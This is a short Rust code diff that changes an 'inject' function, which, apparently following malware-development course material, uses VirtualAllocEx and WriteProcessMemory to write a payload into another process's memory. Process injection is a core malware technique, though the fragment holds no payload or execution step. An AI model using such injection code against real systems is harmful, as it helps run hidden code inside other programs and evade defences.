@@ -11,13 +11,13 @@ use winapi::{
 };
 // Inject payload into target process
 // Probably a rustier way to do this, but it works, copies course material
-pub fn inject(h_proc: HANDLE, payload: &[u8]) -> i32 {
+pub fn inject(h_proc: HANDLE, payload: *const u8, payload_len: usize) -> i32 {
     // https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex
     let p_remote_code = unsafe {
         VirtualAllocEx(
             h_proc,
             null_mut(),
-            payload.len(),
+            payload_len,
             MEM_COMMIT,
             PAGE_EXECUTE_READ,
         )
@@ -32,8 +32,8 @@ pub fn inject(h_proc: HANDLE, payload: &[u8]) -> i32 {
         WriteProcessMemory(
             h_proc,
             p_remote_code,
-            payload.as_ptr() as _,
-            payload.len(),
+            payload as _,
+            payload_len,
             &mut bytes_written,
         )
     };
